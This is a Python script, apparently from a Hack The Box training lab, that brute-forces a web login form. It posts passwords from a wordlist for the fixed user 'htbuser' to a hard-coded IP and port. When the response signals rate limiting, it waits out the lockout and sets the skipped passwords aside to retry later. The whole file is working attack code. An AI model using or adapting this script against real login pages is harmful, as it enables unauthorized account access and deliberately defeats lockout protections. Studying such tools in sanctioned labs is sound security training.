import requests
import time

# file that contain user:pass
passfile = "sort4.txt"

# create url using user and password as argument
url = "http://94.237.49.182:50469/"

# rate limit blocks for 30 seconds
lock_time = 40

# message that alert us we hit rate limit
lock_message = "Too many login"

# read user and password
with open(passfile, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        # take password, join to keep password that contain a :
        password = fline

        # prepare POST data
        data = {
            "userid": "htbuser",
            "rpasswd": password,
            "submit": "submit"
        }

        # do the request
        res = requests.post(url, data=data)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print(f"[-] Invalid credentials: userid:{"htbuser"} passwd:{password}")
        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            with open("skip.txt", "a") as file:
                file.write(password)
            print(f"[-] Hit rate limit in {password}[!] sleeping {lock_time}\n")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)
        # user and password were valid !
        else:
            print(f"[+] Valid credentials: userid:{"htbuser"} passwd:{password} [+]")   
            break
